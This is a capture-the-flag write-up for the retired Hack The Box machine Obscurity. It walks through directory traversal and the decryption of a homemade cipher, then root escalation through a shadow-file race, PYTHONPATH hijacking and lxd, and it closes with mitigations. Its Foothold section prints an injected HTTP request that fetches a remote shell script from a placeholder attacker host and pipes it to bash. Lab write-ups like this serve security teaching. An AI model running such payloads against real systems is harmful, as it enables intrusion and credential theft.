---
machine: Obscurity
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, python, crypto, race-condition, lxd, privesc]
---

# Obscurity — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A custom Python server on 8080 allows directory traversal to read its own code and a handler injection yields `www-data`. A homemade cipher with a known key decrypts `robert`'s password. `BetterSSH` runs as root: a race on the temporary file leaks `/etc/shadow` and command injection runs as root; there is also a `PYTHONPATH` path and an `lxd` group path.

## Recon

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22` SSH and `8080` a custom HTTP server called `BadHTTPServer`.
- `80` and `9000` are closed.
- The page mentions a secret development directory.

## Enumeration

- `wfuzz` with `http://<IP>:8080/FUZZ/SuperSecureServer.py` finds `/develop/`.
- The code passes the path to `exec` without sanitizing it.
- The file can also be read with `curl --path-as-is http://<IP>:8080/../SuperSecureServer.py`.

```bash
curl --path-as-is 'http://<IP>:8080/../SuperSecureServer.py'
```

## Foothold

Send a request whose path contains Python code; the server runs it and returns a reverse shell as `www-data`.

```http
GET /';os.system('curl <ATTACKER>/shell|bash');' HTTP/1.1
Host: <IP>:8080
```

## Lateral movement

`/home/robert` holds `SuperSecureCrypt.py`, `check.txt`, `out.txt` and `passwordreminder.txt`. The cipher is a homemade XOR/shift; the known plaintext in `check.txt` recovers the key `alexandrovich` and decrypts `robert`'s password.

```bash
python3 SuperSecureCrypt.py -i out.txt -k "Encrypting this file..." -d -o key.txt
python3 SuperSecureCrypt.py -i passwordreminder.txt -d -k alexandrovich -o pass.txt
ssh robert@<IP>
```

## Privilege escalation

`robert` can run `BetterSSH.py` as root. The script copies `/etc/shadow` to a temporary file and deletes it after authentication; a race reads it. The post-auth command is also concatenated without validation, so inject `-u root cat /root/root.txt` or a shell.

```bash
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

The alternative is `PYTHONPATH`: the script imports `subprocess` from its directory, and a malicious `subprocess.py` runs as root. The third is the `lxd` group, which mounts `/` in a privileged container.

## Evidence

- `SuperSecureServer.py` and directory traversal.
- Handler injection and `www-data` shell.
- Homemade cipher key and `robert` password.
- `BetterSSH` race and `/etc/shadow`.
- `PYTHONPATH` or `lxd` as root.

## Lessons learned

- A homemade server often has traversal and execution in the same handler.
- Custom ciphers with a key derived from plaintext protect nothing.
- Privileged scripts copying `shadow` to `/tmp` are race-prone.
- `PYTHONPATH` and the `lxd` group are recurring local escalations.

## Mitigation and detection

- Use a maintained server and normalize paths; never `exec` a URL.
- Replace homemade ciphers with AEAD and manage keys outside the code.
- Do not copy `/etc/shadow` to temporary files; use PAM.
- Review privileged scripts, `PYTHONPATH` and `lxd` membership.

## References

- [0xdf — Obscurity](https://0xdf.gitlab.io/2020/05/09/htb-obscurity.html)
- [IppSec — Obscurity](https://www.youtube.com/watch?v=veq3w_j0WZQ)
- [Hack The Box — Obscurity](https://app.hackthebox.com/machines/obscurity)
